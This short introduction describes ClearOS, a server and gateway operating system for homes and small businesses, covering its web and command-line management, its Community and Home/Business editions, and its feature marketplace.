Introduction

ClearOS is a small business server operating system with server,
networking, and gateway functions. It is designed primarily for homes,
small, medium, and distributed environments. It is managed from a web based
user interface, but can also be completely managed and tuned from the
command line. ClearOS is available in a free Community Edition, which
includes available open source updates and patches from its upstream
sources. ClearOS is also offered in a Home and Business Edition which
receives additional testing of updates and only uses tested code for
updates. Professional tech-support is also available. Currently ClearOS
offers around 100+ different features which can be installed through the
onboard ClearOS Marketplace.
